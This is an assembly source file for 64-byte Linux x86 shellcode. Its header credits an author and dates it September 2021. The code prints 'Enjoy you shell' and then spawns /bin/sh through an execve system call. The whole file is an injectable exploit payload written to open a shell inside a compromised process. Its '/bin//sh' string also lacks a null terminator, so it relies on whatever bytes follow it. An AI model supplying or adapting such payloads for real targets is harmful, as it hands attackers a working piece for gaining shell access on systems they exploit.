
%ifdef

	Date ->  4 September 2021 
	Author -> Sarfaraz
	Shellcode -> Linux x86
	Size -> 64 bytes

%endif

section .text
global _start
_start:

	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	jmp text 
print:
	mov al, 4
	mov bl, 1
	pop ecx
	mov dl, 16

	int 0x80

	jmp shellcode


text:
	call print
	db "Enjoy you shell", 0xa

shell:
	mov al, 11
	pop ebx
	xor ecx, ecx
	xor edx, edx
	int 0x80


shellcode:
	call shell
	db "/bin//sh"
